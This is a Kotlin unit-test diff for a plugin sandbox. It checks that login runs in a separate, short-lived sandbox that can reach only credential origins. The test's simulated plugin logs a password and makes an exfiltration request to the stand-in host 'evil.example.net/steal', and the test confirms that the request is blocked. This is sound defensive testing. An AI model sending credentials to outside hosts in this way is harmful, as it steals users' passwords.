@@ -72,6 +72,7 @@ class SandboxRuntimeTest {
         limits: PluginExecutionLimits = PluginExecutionLimits(),
         provenance: InProcessScriptProvenance? = null,
         networkGate: CompletableDeferred<Unit>? = null,
+        policySource: SourceIndexEntry = source,
     ): ScriptPluginEnvironment {
         val transport = object : PluginHttpTransport {
             override suspend fun execute(request: PluginHttpRequest): PluginHttpResponse = respond(request)
@@ -86,7 +87,7 @@ class SandboxRuntimeTest {
             network = PluginNetworkClient(
                 transport = transport,
                 storage = storage,
-                policy = PluginNetworkPolicy(requestOrigins = source.requestOrigins, credentialOrigins = source.credentialOrigins),
+                policy = PluginNetworkPolicy(requestOrigins = policySource.requestOrigins, credentialOrigins = policySource.credentialOrigins),
                 hostResolver = PluginHostResolver { listOf("93.184.216.34") },
             ),
             storage = storage,
@@ -355,6 +356,46 @@ class SandboxRuntimeTest {
         assertEquals(BridgeOutcome.Error(SandboxErrorCode.PERMISSION_DENIED), duringBrowse)
         assertEquals(BridgeOutcome.Value("\"pw\""), duringLogin)
         assertEquals("pw2", storage.getCredential(42)?.password)
+    }
+
+    @Test
+    fun loginRunsInAFreshSandboxThatReachesOnlyCredentialOriginsAndIsDestroyed() = runTest {
+        // ADR-0002 §6.4: the long-lived sandbox never sees the password.
+        val lifecycle = lifecycle()
+        var loginRequest: BridgeOutcome? = null
+        var exfiltration: BridgeOutcome? = null
+        val f = fleet(
+            lifecycle,
+            hooks = emptyPage + mapOf(
+                "login" to {
+                    send(SandboxFrame.Log("password=pw".encodeToByteArray()))
+                    loginRequest = bridge("httpGet", "[\"https://www.example.test/login\"]")
+                    exfiltration = bridge("httpGet", "[\"https://evil.example.net/steal\"]")
+                    HookOutcome.Ok("{\"loggedIn\":true}")
+                },
+            ),
+        )
+        val widerSource = source.copy(requestOrigins = source.requestOrigins + "https://evil.example.net")
+        val runtime = f.factory.createForSource(
+            "var source = {};",
+            manifest.copy(sources = listOf(widerSource)),
+            widerSource,
+            environment(PluginRuntimePermission.CREDENTIAL_ACCESS, PluginRuntimePermission.NETWORK, policySource = widerSource),
+        )
+        runtime.getPopularManga(1)
+        assertEquals(1, f.opened.size)
+
+        assertTrue(runtime.login("alice", "pw"))
+        assertEquals(2, f.opened.size, "login opened a sandbox of its own")
+        assertTrue(f.opened[1].closed, "and destroyed it afterwards")
+        assertFalse(f.opened[0].closed, "the browsing sandbox stays as it was")
+        assertTrue(f.opened[0].received.none { it is SandboxFrame.Invoke && it.method == "login" })
+        // Only the credential origin is reachable while the password is present.
+        assertTrue(loginRequest is BridgeOutcome.Value, loginRequest.toString())
+        assertEquals(BridgeOutcome.Error(SandboxErrorCode.NETWORK_FAILED), exfiltration)
+        assertEquals("pw", storage.getCredential(42)?.password)
+        // Whatever the login script logged is not kept anywhere.
+        assertTrue(runtime.recentLogs.none { "pw" in it }, runtime.recentLogs.toString())
     }
 
     @Test
